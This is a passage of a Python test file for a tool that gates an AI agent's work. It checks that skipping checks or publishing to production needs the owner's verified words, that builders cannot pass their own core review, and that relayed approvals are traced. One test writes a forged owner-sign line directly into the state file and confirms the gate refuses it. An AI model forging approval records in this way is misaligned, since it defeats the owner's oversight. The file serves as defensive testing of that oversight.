                self.assertIn("--means", r.stdout + r.stderr)
                self.assertNotIn("type exactly", r.stdout + r.stderr)

    def test_no_fixed_sentence(self):
        # approval-design (section 53 A1): the main manager reads his words; the tool verifies and stores them
        for block, words in (("BUILD", "the build can be skipped for this one"), ("RELATED TESTS", "skip the tests, only a typo")):
            with self.subTest(words=words):
                r = self.af("todo", "checks", "t", "--remove", block, "--owner-quote", words,
                            "--means", "leave out %s for t" % block)
                self.assertEqual(r.returncode, 0, r.stdout + r.stderr)

    def test_bad_values_are_refused(self):
        for extra in (("--means", "leave out BUILD\nfor t"), ("--means", "leave out BUILD | for t"), ("--means", "  "),
                      ("--means", "leave out BUILD for t", "--question", "1. skip it?\nA. yes"),
                      ("--means", "leave out BUILD for t", "--question", "1. skip it? | A. yes")):
            with self.subTest(extra=extra):
                r = self.af("todo", "checks", "t", "--remove", "BUILD", "--owner-quote", "the build can be skipped",
                            *extra)
                self.assertEqual(r.returncode, 1, r.stdout)
        self.assertNotIn("removed BUILD", self.repo.read("agent_todo.txt"))


@only_own
class TestG15Refusal(Gate):
    def test_an_unclean_merge_says_so(self):
        self.all_pass_but()
        self.git("checkout", "-q", "-b", "trunk", "base")
        self.commit_push({"other.js": "o()\n"})
        self.git("checkout", "-q", "feat")
        self.git("merge", "-q", "--no-ff", "--no-commit", "trunk")
        self.write({"app.js": "y()\nextra()\n"})
        self.git("add", "app.js")
        self.git("commit", "-q", "-m", "Merge trunk into feat")
        self.git("push", "-q", "origin", "feat")
        r = self.af("checks", "gate", "t", "--dir", self.repo.dir, "--base", "origin/trunk")
        self.assertTrue([l for l in r.stdout.splitlines()
                         if l.startswith("PR REVIEW: the merge after the review changed code (")
                         and l.endswith("): review the new head")], r.stdout)


def rule(start, end):
    text = read("PRINCIPLES.md")
    return text[text.index(start):text.index(end)]


@only_own
class TestF2CoreReviewIsNoBuildersJob(TestGate):
    def test_a_core_review_by_the_task_manager_is_refused(self):
        self.passes("DIFF SCAN", "BUILD", "RELATED TESTS")
        self.ok("check", "t", "PR REVIEW", "pass", "--by", "t Reviewer", "--evidence", "read it")
        self.ok("check", "t", "CORE REVIEW", "pass", "--by", "t Task Manager", "--evidence", "read it")
        sys.path.insert(0, BIN)
        import agent_checks
        self.assertIn("CORE REVIEW", agent_checks.BUILDER_BLOCKS)
        r = self.gate()
        if "CORE REVIEW" in r.stdout:
            self.assertIn("CORE REVIEW: pass by the builder (t Task Manager), not accepted", r.stdout.splitlines())

    def test_r8_names_it(self):
        self.assertIn("CORE REVIEW", [x for x in read("rules", "checks.md").splitlines()   # md-slim-principles: R8 stands in rules/checks.md
                                      if "not the builder" in x and "PR REVIEW" in x][0])   # FIX ORDER 1: the late-yes line names the builder too


# ---------------------------------------------------------------- approval-design (requirements/check-blocks.md section 53 A)

LOGGED = ("#!/usr/bin/env bash\nprintf '%%s\\n' \"$@\" >> %s\necho '-- end'  >> %s\n"
          "echo 'OWNER ORDER verified ~/.claude/projects/-r/s1.jsonl 2026-11-26 08:40'\n"
          "echo 'match: \"the words\"'\nexit 0\n")


@only_own
class ApprovalCase(TestGate):
    def setUp(self):
        super().setUp()
        self.log = os.path.join(self.repo.base, "verify.log")
        self.repo.write_bin_script("agent-owner-order.sh", LOGGED % (self.log, self.log))

    def calls(self):
        """The argument lists of every verify call so far."""
        if not os.path.exists(self.log):
            return []
        with open(self.log) as fh:
            parts = fh.read().split("-- end\n")
        return [p.rstrip("\n").split("\n") for p in parts if p.strip()]

    def words(self):
        gd = self.git("rev-parse", "--path-format=absolute", "--git-common-dir").strip()
        path = os.path.join(gd, "agent_owner_words.json")
        if not os.path.exists(path):
            return {}
        with open(path) as fh:
            return json.load(fh)

    def add_p(self, *extra):
        return self.af("todo", "add", "p", "small", "publish it", "10", "--target", "production", *extra)


@only_own
class TestApprovalRecords(ApprovalCase):
    def test_a3_target_production_needs_means(self):
        r = self.add_p("--owner-quote", "2. need to publish direct after done")
        self.assertEqual(r.returncode, 1, r.stdout + r.stderr)
        self.assertIn("--means", r.stdout + r.stderr)
        self.assertNotIn("type exactly", r.stdout + r.stderr)
        self.assertNotIn("p | ", self.todo())
        self.assertNotIn("p", self.words())

    def test_a6_his_words_and_the_means_are_stored(self):
        r = self.add_p("--owner-quote", "2. need to publish direct after done", "--means", "publish task 2 (p) to production")
        self.assertEqual(r.returncode, 0, r.stdout + r.stderr)
        rec = self.words()["p"]["publish"]
        self.assertEqual(rec["quote"], "2. need to publish direct after done")
        self.assertEqual(rec["means"], "publish task 2 (p) to production")
        self.assertEqual(rec["typed"], "2026-11-26 08:40")
        self.assertIs(rec["verified"], True)
        self.assertNotIn("question", rec)
        self.assertIn("target production", self.fields("p"))

    def test_a4_a_short_answer_goes_to_verify_with_its_question(self):
        q = "1. Publish p (the export total) straight to production? A. yes B. no"
        r = self.add_p("--owner-quote", "1A", "--question", q, "--means", "publish p to production")
        self.assertEqual(r.returncode, 0, r.stdout + r.stderr)
        args = self.calls()[-1]
        self.assertEqual(args[0], "verify")
        self.assertEqual(args[args.index("--quote") + 1], "1A")
        self.assertEqual(args[args.index("--question") + 1], q)
        self.assertEqual(self.words()["p"]["publish"]["question"], q)

    def test_a3_means_and_question_belong_to_an_owner_quote(self):
        for extra in (("--means", "publish p to production"), ("--question", "1. publish p? A. yes")):
            with self.subTest(extra=extra):
                r = self.af("todo", "add", "w", "small", "x", "10", *extra)
                self.assertEqual(r.returncode, 1, r.stdout + r.stderr)
                self.assertNotIn("w | ", self.todo())
        r = self.af("check", "t", "BUILD", "pass", "--by", "tm", "--evidence", "ok", "--means", "x")
        self.assertEqual(r.returncode, 1, r.stdout + r.stderr)

    def test_a3_bad_values_are_refused(self):
        for extra in (("--means", "publish p\nto production"), ("--means", "publish p | to production"),
                      ("--means", "   "), ("--means", "publish p", "--question", "1. ok?\nA. yes"),
                      ("--means", "publish p", "--question", "1. ok? | A. yes")):
            with self.subTest(extra=extra):
                r = self.add_p("--owner-quote", "2. need to publish direct after done", *extra)
                self.assertEqual(r.returncode, 1, r.stdout + r.stderr)
                self.assertNotIn("p | ", self.todo())

    def test_a6_a_removal_stores_its_words(self):
        self.ok("todo", "checks", "t", "UI CHECK")
        self.ok("todo", "checks", "t", "--remove", "UI CHECK", "--owner-quote", "nothing on screen changes, skip the ui check",
                "--means", "leave out UI CHECK for t")
        rec = self.words()["t"]["skip"]["UI CHECK"]
        self.assertEqual(rec["quote"], "nothing on screen changes, skip the ui check")
        self.assertEqual(rec["means"], "leave out UI CHECK for t")
        self.assertEqual(rec["typed"], "2026-11-26 08:40")

    def test_a6_the_words_end_with_the_task(self):
        self.ok("todo", "checks", "t", "UI CHECK")
        self.ok("todo", "checks", "t", "--remove", "UI CHECK", "--owner-quote", "skip the ui check",
                "--means", "leave out UI CHECK for t")
        self.ok("todo", "done", "t", "--work", "5", "--type", "script", "--lane", "fast")
        self.assertNotIn("t", self.words())

    def test_a7_owner_sign_holds_the_means_and_the_question(self):
        q = "2. Sign the new roles of t? A. yes B. no"
        self.ok("check", "t", "OWNER SIGN", "pass", "--by", "owner", "--owner-quote", "2A", "--question", q,
                "--means", "sign the new roles of t")
        last = self.state().strip().splitlines()[-1]
        self.assertIn('owner order verified: 2A | means: sign the new roles of t | question: %s | typed: 2026-11-26 08:40 | ' % q,
                      last)
        r = self.af("check", "t", "OWNER SIGN", "pass", "--by", "owner", "--owner-quote", "yes sign it")
        self.assertEqual(r.returncode, 1, r.stdout + r.stderr)
        self.assertIn("--means", r.stdout + r.stderr)


@only_own
class TestApprovalPrinted(ApprovalCase):
    """Section 53 A8: the gate prints every stored pair, so he always sees which words were taken as his yes."""

    def all_pass(self, task="t"):
        for b in ("DIFF SCAN", "BUILD", "RELATED TESTS"):
            self.ok("check", task, b, "pass", "--by", "tm", "--evidence", "ok")
        self.ok("check", task, "PR REVIEW", "pass", "--by", task + " Review", "--evidence", "read it")

    def test_a8_the_gate_prints_the_removal_and_the_sign(self):
        self.ok("todo", "checks", "t", "UI CHECK,OWNER SIGN")
        self.ok("todo", "checks", "t", "--remove", "UI CHECK", "--owner-quote", "1B", "--question",
                "1. Run the UI CHECK for t? A. yes B. no, leave it out", "--means", "leave out UI CHECK for t")
        self.ok("check", "t", "OWNER SIGN", "pass", "--by", "owner", "--owner-quote", "yes, the new roles are fine",
                "--means", "sign the new roles of t")
        self.all_pass()
        r = self.gate()
        self.assertEqual(r.returncode, 0, r.stdout + r.stderr)
        lines = r.stdout.splitlines()
        skip = 'OWNER WORDS skip UI CHECK: "1B" (typed 2026-11-26 08:40) read as: leave out UI CHECK for t' \
               ' | question: "1. Run the UI CHECK for t? A. yes B. no, leave it out"'
        sign = 'OWNER WORDS OWNER SIGN: "yes, the new roles are fine" (typed 2026-11-26 08:40) read as: sign the new roles of t'
        self.assertIn(skip, lines)
        self.assertIn(sign, lines)
        gate = next(i for i, l in enumerate(lines) if l.startswith("GATE "))
        self.assertLess(lines.index(skip), gate)
        self.assertLess(lines.index(sign), gate)

    def test_a8_printed_on_a_refusal_too(self):
        self.ok("todo", "checks", "t", "UI CHECK")
        self.ok("todo", "checks", "t", "--remove", "UI CHECK", "--owner-quote", "skip the ui check for t",
                "--means", "leave out UI CHECK for t")
        r = self.gate()      # nothing passed yet
        self.assertEqual(r.returncode, 1, r.stdout)
        self.assertIn('OWNER WORDS skip UI CHECK: "skip the ui check for t" (typed 2026-11-26 08:40) read as: '
                      'leave out UI CHECK for t', r.stdout.splitlines())

    def test_a8_a_task_with_no_words_prints_none(self):
        self.all_pass()
        r = self.gate()
        self.assertEqual(r.returncode, 0, r.stdout)
        self.assertNotIn("OWNER WORDS", r.stdout)

    def test_a7_the_gate_verifies_the_sign_again_at_its_typed_minute(self):
        self.ok("todo", "checks", "t", "OWNER SIGN")
        self.ok("check", "t", "OWNER SIGN", "pass", "--by", "owner", "--owner-quote", "3A", "--question",
                "3. Sign t? A. yes B. no", "--means", "sign t")
        self.all_pass()
        before = len(self.calls())
        self.assertEqual(self.gate().returncode, 0)
        args = self.calls()[before]
        self.assertEqual(args[args.index("--quote") + 1], "3A")
        self.assertEqual(args[args.index("--time") + 1], "2026-11-26 08:40")
        self.assertEqual(args[args.index("--question") + 1], "3. Sign t? A. yes B. no")

    def test_a7_an_old_sign_line_without_means_is_not_accepted(self):
        self.ok("todo", "checks", "t", "OWNER SIGN")
        self.all_pass()
        head, opened = self.at_now()
        with open(os.path.join(self.repo.dir, "agent_state.txt"), "a") as fh:
            fh.write("CHECK t OWNER SIGN: pass | by owner | at %s | owner order verified: yes merge it | %s\n" % (head, opened))
        r = self.gate()
        self.assertEqual(r.returncode, 1, r.stdout)
        self.assertIn("OWNER SIGN: pass not verified, not accepted", r.stdout.splitlines())


# ---------------------------------------------------------------- FIX ORDER 1 (TELL cdacc0c5) R2, R3

def sender_repo(base, name="sender-repo", mark="agent_main.lock"):
    """A git repo with a main manager lock (or the closed mark of one): what a relay comes from (FIX ORDER 2 S3)."""
    path = os.path.join(base, name)
    os.makedirs(path)
    subprocess.run(["git", "init", "-q", path], check=True)
    if mark:
        with open(os.path.join(path, ".git", mark), "w") as fh:
            fh.write("4242 2026-11-26 08:00 s1 term_m\n")
    return path


@only_own
class TestTodoTarget(ApprovalCase):
    """R2: a yes that comes after the task was added: `todo target <task> production` keeps the task instance."""

    def target(self, *extra):
        return self.af("todo", "target", "t", "production", *extra)

    def test_r2_the_line_keeps_its_instance(self):
        self.ok("todo", "stage", "t", "workers")
        self.ok("check", "t", "BUILD", "pass", "--by", "tm", "--evidence", "ok")
        before = self.fields("t")
        r = self.target("--owner-quote", "the footer one can go live", "--means", "publish t (the footer fix) to production")
        self.assertEqual(r.returncode, 0, r.stdout + r.stderr)
        after = self.fields("t")
        self.assertEqual([f for f in after if not f.startswith("target ")], [f for f in before if not f.startswith("target ")])
        self.assertIn("target production", after)
        rec = self.words()["t"]["publish"]
        self.assertEqual((rec["quote"], rec["means"]), ("the footer one can go live", "publish t (the footer fix) to production"))

    def test_r2_a_working_target_becomes_production(self):
        self.ok("todo", "add", "w", "small", "the footer", "10", "--target", "working")
        self.ok("todo", "target", "w", "production", "--owner-quote", "the footer one can go live",
                "--means", "publish w to production")
        f = self.fields("w")
        self.assertIn("target production", f)
        self.assertNotIn("target working", f)

    def test_r2_the_check_lines_still_count(self):
        for b in ("DIFF SCAN", "BUILD", "RELATED TESTS"):
            self.ok("check", "t", b, "pass", "--by", "tm", "--evidence", "ok")
        self.ok("check", "t", "PR REVIEW", "pass", "--by", "t Review", "--evidence", "read it")
        self.ok("todo", "target", "t", "production", "--owner-quote", "2. need to publish direct after done",
                "--means", "publish task 2 (t) to production")
        r = self.gate()
        self.assertEqual(r.returncode, 0, r.stdout)
        self.assertIn('OWNER WORDS publish: "2. need to publish direct after done" (typed 2026-11-26 08:40) read as: '
                      'publish task 2 (t) to production', r.stdout.splitlines())

    def test_s1_it_prints_the_next_step(self):
        # FIX ORDER 2 S1: no rebase; a new fast-lane deputy cherry-picks the task's own commits onto a new branch
        r = self.target("--owner-quote", "the footer one can go live", "--means", "publish t to production")
        self.assertEqual(r.returncode, 0, r.stdout + r.stderr)
        nxt = [l for l in r.stdout.splitlines() if l.startswith("next: ")]
        self.assertEqual(len(nxt), 1, r.stdout)
        for word in ("new fast-lane deputy", "cherry-pick", "every planned block", "agent-promote.sh --task t --branch"):
            with self.subTest(word=word):
                self.assertIn(word, nxt[0])

    def test_r2_refusals_change_nothing(self):
        before = self.todo()
        for args in (("todo", "target", "t", "production", "--owner-quote", "the footer one can go live"),   # no --means
                     ("todo", "target", "nope", "production", "--owner-quote", "x can go live", "--means", "publish x"),
                     ("todo", "target", "t", "staging", "--owner-quote", "the footer one can go live", "--means", "m"),
                     ("todo", "target", "t", "production")):
            with self.subTest(args=args):
                r = self.af(*args)
                self.assertEqual(r.returncode, 1, r.stdout + r.stderr)
        self.repo.write_bin_script("agent-owner-order.sh", "#!/usr/bin/env bash\necho 'not found'\nexit 1\n")
        r = self.target("--owner-quote", "the footer one can go live", "--means", "publish t to production")
        self.assertEqual(r.returncode, 1, r.stdout + r.stderr)
        self.assertEqual(self.todo(), before)
        self.assertNotIn("t", self.words())


@only_own
class TestRelayedFrom(ApprovalCase):
    """R3: a relayed owner order is verified where he typed it (the sender's repo) and the record says so."""

    def setUp(self):
        super().setUp()
        self.sender = sender_repo(self.repo.base)      # FIX ORDER 2 S3: a repo whose main manager lock exists

    def repo_arg(self, args):
        return args[args.index("--repo") + 1]

    def test_r3_todo_add_verifies_in_the_sender_repo(self):
        r = self.add_p("--owner-quote", "merge the export fix to main after done", "--means", "publish p to production",
                       "--relayed-from", self.sender)
        self.assertEqual(r.returncode, 0, r.stdout + r.stderr)
        self.assertEqual(self.repo_arg(self.calls()[-1]), self.sender)
        self.assertEqual(self.words()["p"]["publish"]["relayed_from"], self.sender)

    def test_r3_the_gate_prints_where_he_typed_it(self):
        self.ok("todo", "checks", "t", "UI CHECK,OWNER SIGN")
        self.ok("todo", "checks", "t", "--remove", "UI CHECK", "--owner-quote", "skip the ui check for t please",
                "--means", "leave out UI CHECK for t", "--relayed-from", self.sender)
        self.assertEqual(self.repo_arg(self.calls()[-1]), self.sender)
        self.ok("check", "t", "OWNER SIGN", "pass", "--by", "owner", "--owner-quote", "yes, the new roles are fine",
                "--means", "sign the new roles of t", "--relayed-from", self.sender)
        self.assertIn("| relayed from: %s |" % self.sender, self.state().strip().splitlines()[-1])
        n = len(self.calls())
        r = self.gate()
        self.assertIn('OWNER WORDS skip UI CHECK: "skip the ui check for t please" (typed 2026-11-26 08:40) read as: '
                      'leave out UI CHECK for t | relayed from %s' % self.sender, r.stdout.splitlines())
        self.assertIn('OWNER WORDS OWNER SIGN: "yes, the new roles are fine" (typed 2026-11-26 08:40) read as: '
                      'sign the new roles of t | relayed from %s' % self.sender, r.stdout.splitlines())
        self.assertTrue(any(self.repo_arg(c) == self.sender for c in self.calls()[n:]), "the sign is verified again there")

    def test_r3_todo_target_takes_it_too(self):
        self.ok("todo", "target", "t", "production", "--owner-quote", "the footer one can go live", "--means",
                "publish t to production", "--relayed-from", self.sender)
        self.assertEqual(self.repo_arg(self.calls()[-1]), self.sender)

    def test_s3_the_folder_must_be_a_repo_with_a_main_manager(self):
        plain = os.path.join(self.repo.base, "plain-folder")
        os.makedirs(plain)
        no_lock = sender_repo(self.repo.base, "no-lock-repo", mark=None)
        for folder in (plain, no_lock):
            with self.subTest(folder=folder):
                r = self.add_p("--owner-quote", "merge the export fix to main after done", "--means", "publish p",
                               "--relayed-from", folder)
                self.assertEqual(r.returncode, 1, r.stdout + r.stderr)
                self.assertIn("main manager", r.stdout + r.stderr)
                self.assertNotIn("p | ", self.todo())
        closed = sender_repo(self.repo.base, "closed-repo", mark="agent_main.closed")
        r = self.add_p("--owner-quote", "merge the export fix to main after done", "--means", "publish p",
                       "--relayed-from", closed)
        self.assertEqual(r.returncode, 0, r.stdout + r.stderr)

    def test_r3_bad_uses_are_refused(self):
        for extra in (("--owner-quote", "merge the export fix to main", "--means", "publish p", "--relayed-from", "rel/path"),
                      ("--means", "publish p", "--relayed-from", self.sender)):
            with self.subTest(extra=extra):
                r = self.add_p(*extra)
                self.assertEqual(r.returncode, 1, r.stdout + r.stderr)
                self.assertNotIn("p | ", self.todo())


class TestFieldPrefixes(unittest.TestCase):
    """estimate-improve fix order 2 A: a field name that is the prefix of another never matches it."""

    def test_stage_is_not_the_stage_log(self):
        sys.path.insert(0, os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "bin"))
        import importlib
        import agent_checks
        agent_checks = importlib.reload(agent_checks)
        f = ["x", "big", "w", "est 80m", "est0 60m", "added 20m", "stage log brief 0, tests 30",
             "started 2026-11-13 08:00", "stage tests since 2026-11-13 11:00"]
        self.assertEqual(agent_checks.field_of(f, "stage"), "tests since 2026-11-13 11:00")
        self.assertEqual(agent_checks.field_index(f, "stage"), 8)
        self.assertEqual(agent_checks.field_of(f, "est"), "80m")
        self.assertEqual(agent_checks.field_of(f, "stage log"), "brief 0, tests 30")
        self.assertIsNone(agent_checks.field_of(f[:8], "stage"))


if __name__ == "__main__":
    unittest.main()
